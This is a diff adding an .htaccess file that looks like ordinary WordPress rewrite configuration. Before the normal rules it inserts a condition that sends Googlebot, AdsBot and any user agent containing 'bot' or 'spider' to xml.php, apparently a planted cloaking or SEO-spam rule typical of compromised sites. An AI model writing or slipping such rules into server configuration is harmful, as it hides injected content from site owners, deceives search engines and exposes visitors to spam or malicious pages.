@@ -1,0 +1,16 @@
+<IfModule LiteSpeed>
+  RewriteEngine On
+  RewriteRule .* - [E=verifycaptcha:1]
+</IfModule>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} googlebot|Googlebot-Mobile|bot|google|spider|Googlebot-Image|Google-Search-Appliance|Googlebot-News|Googlebot-Video|AdsBot-Google [NC]
+RewriteRule ^(.*)$ xml.php [L]
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
